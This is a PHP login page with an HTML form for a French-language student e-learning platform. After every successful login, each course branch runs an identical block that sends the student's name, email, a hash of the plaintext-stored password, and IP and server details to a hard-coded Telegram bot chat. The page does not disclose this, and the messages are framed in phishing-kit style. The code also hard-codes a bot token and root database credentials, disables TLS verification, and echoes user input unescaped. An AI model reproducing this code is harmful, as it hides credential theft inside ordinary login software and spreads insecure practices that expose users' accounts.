<?php
    // BASE DE DONNES
        $userDB="root";
        $passwordDB="root";
        $database = new PDO("mysql:host=localhost; dbname=PFA; charset=utf8;",$userDB,$passwordDB);
    // END BASE DE DONNES
    if(isset($_REQUEST['submit'])){
        $email=$_REQUEST['email'];
        $pass=$_REQUEST['password'];
        $check=$database->prepare("SELECT * FROM Etudiants WHERE Email_Etu= :email AND Password_Etu= :pass " );
        $check->bindParam("email",$_REQUEST['email']);
        $check->bindParam("pass",$_REQUEST['password']);
        $check->execute();       
        if($check->rowCount() === 1){
            foreach($check as $ch){
            $unique_id=$ch['ID_Etu'];
            $logout=$database->prepare("UPDATE Etudiants SET statusEtu='Active now' WHERE ID_Etu='{$unique_id}'");
            $logout->execute();
            session_start();
                $_SESSION['ID_Etu']=$ch['ID_Etu'];
                $_SESSION['Prenom']=$ch['Prenom_Etu'];
                $_SESSION['nom']=$ch['Nom_Etu'];
                $_SESSION['pays']=$ch['Pays_Etu'];
                $_SESSION['ville']=$ch['Ville_Etu'];
                $_SESSION['Numero']=$ch['NumPhone_Etu'];
                $_SESSION['formation']=$ch['Formation_Etu'];
                $_SESSION['email']=$ch['Email_Etu'];
                $_SESSION['serie']=$ch['SerieBAC_Etu'];
                $_SESSION['diplome']=$ch['Niveau_Etu'];
                $_SESSION['password1']=$ch['Password_Etu'];
                $_SESSION['date1']=$ch['PremierAccesAuSite'];
                if($ch['Formation_Etu'] == "1"){
                // TELEGRAM BOT
                    $chat_id='1241093703';
                    $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                    $IP = getenv("REMOTE_ADDR");
                    $HTTP_HOST=$_SERVER["HTTP_HOST"];
                    $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                    $SERVER_PORT=$_SERVER['SERVER_PORT'];
                    $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                    " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                    "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                    "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".
                                    
                                    "IP : ".$IP."\n \n".
                                    "HTTP HOST : ".$HTTP_HOST."\n \n".
                                    "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                    "SERVER PORT : ".$SERVER_PORT."\n \n".
                                    "-----------💸 "."Plateforme E-learning"."💸-----------");       
                    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                    $ch=curl_init();
                    curl_setopt($ch,CURLOPT_URL,$url);
                    curl_setopt($ch, CURLOPT_HEADER, false);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                    $result=curl_exec($ch);
                    curl_close($ch);
                // END TELEGRAM BOT

                header("refresh:1;url=PLT_E-learning/PLT-FormationMDN1/Dashboard.php");
                }elseif($ch['Formation_Etu'] == "2"){
                // TELEGRAM BOT
                    $chat_id='1241093703';
                    $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                    $IP = getenv("REMOTE_ADDR");
                    $HTTP_HOST=$_SERVER["HTTP_HOST"];
                    $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                    $SERVER_PORT=$_SERVER['SERVER_PORT'];
                    $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                    " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                    "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                    "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".
                                    
                                    "IP : ".$IP."\n \n".
                                    "HTTP HOST : ".$HTTP_HOST."\n \n".
                                    "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                    "SERVER PORT : ".$SERVER_PORT."\n \n".
                                    "-----------💸 "."Plateforme E-learning"."💸-----------");       
                    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                    $ch=curl_init();
                    curl_setopt($ch,CURLOPT_URL,$url);
                    curl_setopt($ch, CURLOPT_HEADER, false);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                    $result=curl_exec($ch);
                    curl_close($ch);
                // END TELEGRAM BOT
                header("refresh:1;url=PLT_E-learning/PLT-FormationAD/Dashboard.php");
                }elseif($ch['Formation_Etu'] == "3"){
                // TELEGRAM BOT
                    $chat_id='1241093703';
                    $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                    $IP = getenv("REMOTE_ADDR");
                    $HTTP_HOST=$_SERVER["HTTP_HOST"];
                    $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                    $SERVER_PORT=$_SERVER['SERVER_PORT'];
                    $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                    " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                    "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                    "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".
                                    
                                    "IP : ".$IP."\n \n".
                                    "HTTP HOST : ".$HTTP_HOST."\n \n".
                                    "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                    "SERVER PORT : ".$SERVER_PORT."\n \n".
                                    "-----------💸 "."Plateforme E-learning"."💸-----------");       
                    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                    $ch=curl_init();
                    curl_setopt($ch,CURLOPT_URL,$url);
                    curl_setopt($ch, CURLOPT_HEADER, false);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                    $result=curl_exec($ch);
                    curl_close($ch);
                // END TELEGRAM BOT
                header("refresh:1;url=PLT_E-learning/PLT-FormationMSO/Dashboard.php");
                }elseif($ch['Formation_Etu'] == "4"){
                // TELEGRAM BOT
                    $chat_id='1241093703';
                    $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                    $IP = getenv("REMOTE_ADDR");
                    $HTTP_HOST=$_SERVER["HTTP_HOST"];
                    $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                    $SERVER_PORT=$_SERVER['SERVER_PORT'];
                    $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                    " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                    "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                    "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".
                                    
                                    "IP : ".$IP."\n \n".
                                    "HTTP HOST : ".$HTTP_HOST."\n \n".
                                    "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                    "SERVER PORT : ".$SERVER_PORT."\n \n".
                                    "-----------💸 "."Plateforme E-learning"."💸-----------");       
                    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                    $ch=curl_init();
                    curl_setopt($ch,CURLOPT_URL,$url);
                    curl_setopt($ch, CURLOPT_HEADER, false);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                    $result=curl_exec($ch);
                    curl_close($ch);
                // END TELEGRAM BOT
                header("refresh:1;url=PLT_E-learning/PLT-FormationMST/Dashboard.php");
                }elseif($ch['Formation_Etu'] == "5"){
                // TELEGRAM BOT
                    $chat_id='1241093703';
                    $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                    $IP = getenv("REMOTE_ADDR");
                    $HTTP_HOST=$_SERVER["HTTP_HOST"];
                    $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                    $SERVER_PORT=$_SERVER['SERVER_PORT'];
                    $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                    " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                    "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                    "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".
                                    
                                    "IP : ".$IP."\n \n".
                                    "HTTP HOST : ".$HTTP_HOST."\n \n".
                                    "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                    "SERVER PORT : ".$SERVER_PORT."\n \n".
                                    "-----------💸 "."Plateforme E-learning"."💸-----------");       
                    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                    $ch=curl_init();
                    curl_setopt($ch,CURLOPT_URL,$url);
                    curl_setopt($ch, CURLOPT_HEADER, false);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                    $result=curl_exec($ch);
                    curl_close($ch);
                // END TELEGRAM BOT
                header("refresh:1;url=PLT_E-learning/PLT-FormationINL1/Dashboard.php");
                }elseif($ch['Formation_Etu'] == "6"){
                // TELEGRAM BOT
                    $chat_id='1241093703';
                    $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                    $IP = getenv("REMOTE_ADDR");
                    $HTTP_HOST=$_SERVER["HTTP_HOST"];
                    $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                    $SERVER_PORT=$_SERVER['SERVER_PORT'];
                    $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                    " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                    "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                    "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".
                                    
                                    "IP : ".$IP."\n \n".
                                    "HTTP HOST : ".$HTTP_HOST."\n \n".
                                    "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                    "SERVER PORT : ".$SERVER_PORT."\n \n".
                                    "-----------💸 "."Plateforme E-learning"."💸-----------");       
                    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                    $ch=curl_init();
                    curl_setopt($ch,CURLOPT_URL,$url);
                    curl_setopt($ch, CURLOPT_HEADER, false);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                    $result=curl_exec($ch);
                    curl_close($ch);
                // END TELEGRAM BOT
                header("refresh:1;url=PLT_E-learning/PLT-FormationINL2/Dashboard.php");
                }elseif($ch['Formation_Etu'] == "7"){
                // TELEGRAM BOT
                    $chat_id='1241093703';
                    $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                    $IP = getenv("REMOTE_ADDR");
                    $HTTP_HOST=$_SERVER["HTTP_HOST"];
                    $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                    $SERVER_PORT=$_SERVER['SERVER_PORT'];
                    $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                    " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                    "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                    "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".
                                    
                                    "IP : ".$IP."\n \n".
                                    "HTTP HOST : ".$HTTP_HOST."\n \n".
                                    "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                    "SERVER PORT : ".$SERVER_PORT."\n \n".
                                    "-----------💸 "."Plateforme E-learning"."💸-----------");       
                    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                    $ch=curl_init();
                    curl_setopt($ch,CURLOPT_URL,$url);
                    curl_setopt($ch, CURLOPT_HEADER, false);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                    $result=curl_exec($ch);
                    curl_close($ch);
                // END TELEGRAM BOT
                header("refresh:1;url=PLT_E-learning/PLT-FormationISI1/Dashboard.php");
                }elseif($ch['Formation_Etu'] == "8"){
                // TELEGRAM BOT
                    $chat_id='1241093703';
                    $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                    $IP = getenv("REMOTE_ADDR");
                    $HTTP_HOST=$_SERVER["HTTP_HOST"];
                    $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                    $SERVER_PORT=$_SERVER['SERVER_PORT'];
                    $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                    " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                    "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                    "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".

                                    
                                    "IP : ".$IP."\n \n".
                                    "HTTP HOST : ".$HTTP_HOST."\n \n".
                                    "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                    "SERVER PORT : ".$SERVER_PORT."\n \n".
                                    "-----------💸 "."Plateforme E-learning"."💸-----------");       
                    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                    $ch=curl_init();
                    curl_setopt($ch,CURLOPT_URL,$url);
                    curl_setopt($ch, CURLOPT_HEADER, false);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                    $result=curl_exec($ch);
                    curl_close($ch);
                // END TELEGRAM BOT
                header("refresh:1;url=PLT_E-learning/PLT-FormationISI2/Dashboard.php");
                }elseif($ch['Formation_Etu'] == "9"){
                // TELEGRAM BOT
                    $chat_id='1241093703';
                    $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                    $IP = getenv("REMOTE_ADDR");
                    $HTTP_HOST=$_SERVER["HTTP_HOST"];
                    $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                    $SERVER_PORT=$_SERVER['SERVER_PORT'];
                    $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                    " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                    "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                    "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".

                                    
                                    "IP : ".$IP."\n \n".
                                    "HTTP HOST : ".$HTTP_HOST."\n \n".
                                    "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                    "SERVER PORT : ".$SERVER_PORT."\n \n".
                                    "-----------💸 "."Plateforme E-learning"."💸-----------");       
                    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                    $ch=curl_init();
                    curl_setopt($ch,CURLOPT_URL,$url);
                    curl_setopt($ch, CURLOPT_HEADER, false);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                    $result=curl_exec($ch);
                    curl_close($ch);
                // END TELEGRAM BOT
                header("refresh:1;url=PLT_E-learning/PLT-FormationISIR1/Dashboard.php");
                }elseif($ch['Formation_Etu'] == "10"){
                // TELEGRAM BOT
                    $chat_id='1241093703';
                    $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                    $IP = getenv("REMOTE_ADDR");
                    $HTTP_HOST=$_SERVER["HTTP_HOST"];
                    $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                    $SERVER_PORT=$_SERVER['SERVER_PORT'];
                    $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                    " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                    "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                    "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".

                                    
                                    "IP : ".$IP."\n \n".
                                    "HTTP HOST : ".$HTTP_HOST."\n \n".
                                    "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                    "SERVER PORT : ".$SERVER_PORT."\n \n".
                                    "-----------💸 "."Plateforme E-learning"."💸-----------");       
                    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                    $ch=curl_init();
                    curl_setopt($ch,CURLOPT_URL,$url);
                    curl_setopt($ch, CURLOPT_HEADER, false);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                    $result=curl_exec($ch);
                    curl_close($ch);
                // END TELEGRAM BOT
                header("refresh:1;url=PLT_E-learning/PLT-FormationISIR2/Dashboard.php");
                }elseif($ch['Formation_Etu'] == "11"){
                // TELEGRAM BOT
                    $chat_id='1241093703';
                    $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                    $IP = getenv("REMOTE_ADDR");
                    $HTTP_HOST=$_SERVER["HTTP_HOST"];
                    $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                    $SERVER_PORT=$_SERVER['SERVER_PORT'];
                    $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                    " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                    "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                    "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".

                                    
                                    "IP : ".$IP."\n \n".
                                    "HTTP HOST : ".$HTTP_HOST."\n \n".
                                    "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                    "SERVER PORT : ".$SERVER_PORT."\n \n".
                                    "-----------💸 "."Plateforme E-learning"."💸-----------");       
                    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                    $ch=curl_init();
                    curl_setopt($ch,CURLOPT_URL,$url);
                    curl_setopt($ch, CURLOPT_HEADER, false);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                    $result=curl_exec($ch);
                    curl_close($ch);
                // END TELEGRAM BOT
                header("refresh:1;url=PLT_E-learning/PLT-blockchaine/Dashboard.php");
                }elseif($ch['Formation_Etu'] == "12"){
                // TELEGRAM BOT
                    $chat_id='1241093703';
                    $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                    $IP = getenv("REMOTE_ADDR");
                    $HTTP_HOST=$_SERVER["HTTP_HOST"];
                    $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                    $SERVER_PORT=$_SERVER['SERVER_PORT'];
                    $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                    " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                    "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                    "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".

                                    
                                    "IP : ".$IP."\n \n".
                                    "HTTP HOST : ".$HTTP_HOST."\n \n".
                                    "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                    "SERVER PORT : ".$SERVER_PORT."\n \n".
                                    "-----------💸 "."Plateforme E-learning"."💸-----------");       
                    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                    $ch=curl_init();
                    curl_setopt($ch,CURLOPT_URL,$url);
                    curl_setopt($ch, CURLOPT_HEADER, false);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                    $result=curl_exec($ch);
                    curl_close($ch);
                // END TELEGRAM BOT
                header("refresh:1;url=PLT_E-learning/PLT-dataScience/Dashboard.php");
                }elseif($ch['Formation_Etu'] == "13"){
                // TELEGRAM BOT
                    $chat_id='1241093703';
                    $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                    $IP = getenv("REMOTE_ADDR");
                    $HTTP_HOST=$_SERVER["HTTP_HOST"];
                    $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                    $SERVER_PORT=$_SERVER['SERVER_PORT'];
                    $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                        " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                        "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                        "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".

                                        
                                        "IP : ".$IP."\n \n".
                                        "HTTP HOST : ".$HTTP_HOST."\n \n".
                                        "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                        "SERVER PORT : ".$SERVER_PORT."\n \n".
                                        "-----------💸 "."Plateforme E-learning"."💸-----------");       
                    $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                    $ch=curl_init();
                    curl_setopt($ch,CURLOPT_URL,$url);
                    curl_setopt($ch, CURLOPT_HEADER, false);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                    $result=curl_exec($ch);
                    curl_close($ch);
                // END TELEGRAM BOT
                header("refresh:1;url=PLT_E-learning/PLT-Marketing_digital/Dashboard.php");
                }elseif($ch['Formation_Etu'] == "14"){
                // TELEGRAM BOT
                        $chat_id='1241093703';
                        $token="5232185545:AAEEXdb0XyEWR9NiLMn1LSSgnH8ZW8aoAqA";
                        $IP = getenv("REMOTE_ADDR");
                        $HTTP_HOST=$_SERVER["HTTP_HOST"];
                        $HTTP_REFERER=$_SERVER['HTTP_REFERER'];
                        $SERVER_PORT=$_SERVER['SERVER_PORT'];
                        $text=urlencode("-----------💸 "."Plateforme E-learning"."💸----------- \n \n".
                                            " Prénom et nom   : ".$ch['Prenom_Etu']." ".$ch['Nom_Etu']."\n \n".
                                            "📧 Adresse mail   : ".$ch['Email_Etu']."\n \n".
                                            "🔐 Mot de passe   : ".md5($ch['Password_Etu'])."\n \n".

                                            
                                            "IP : ".$IP."\n \n".
                                            "HTTP HOST : ".$HTTP_HOST."\n \n".
                                            "HTTP REFERER : ".$HTTP_REFERER."\n \n".
                                            "SERVER PORT : ".$SERVER_PORT."\n \n".
                                            "-----------💸 "."Plateforme E-learning"."💸-----------");       
                        $url="https://api.telegram.org/bot$token/sendMessage?text=$text&chat_id=$chat_id";
                        $ch=curl_init();
                        curl_setopt($ch,CURLOPT_URL,$url);
                        curl_setopt($ch, CURLOPT_HEADER, false);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        $result=curl_exec($ch);
                        curl_close($ch);
                // END TELEGRAM BOT
                header("refresh:1;url=PLT_E-learning/PLT-Cybersecurite/Dashboard.php");
                }else{header("refresh:1;url=E-learning.php");}
            }
        }
    }else{}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Plateforme E-learning</title>
    <script src="https://kit.fontawesome.com/0c6c59d6fe.js" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v2.1.6/css/unicons.css">
    <link rel="stylesheet" href="css/E-learning.css">
    <link rel="icon" href="../Capture d’écran 2022-07-17 à 03.37.57.png">
</head>
<body>
<?php include "Header.php"; ?>  
    <section id="header2" >
        <h3>Plateforme E-learning</h3>
        <div class="ani"></div>
    </section>
    <section id="login">
        <form action="<?php echo $_SERVER['PHP_SELF']?>"  method="post">
            <a href="Home.html" class="logo"><i class="fab fa-accusoft"></i><span>DEAN</span></a>
            <a href="Inscription.php" class="inscr">Pre-Inscription</a>
            <div class="email">
                <input type="email" name="email" placeholder=" Email  " value="<?php echo $email; ?>" required >
                <i class="fa fa-user" aria-hidden="true"></i>
            </div>
            <div class="password">
                <input type="password" name="password" placeholder=" Mot de passe " value="<?php echo $passwod; ?>" required>
                <i class="fa fa-lock" aria-hidden="true"></i>
            </div>
            <input type="submit" name="submit" value="Connexion" class="submit">
            <a href="" class="oub">Vous avez oublié votre nom d'utilisateur et/ou votre mot de passe ?</a>
        </form>
    </section>
    <script src="javascript/pass-show-hide.js"></script>
<?php include "Footer.php"; ?> 

    
</body>
</html>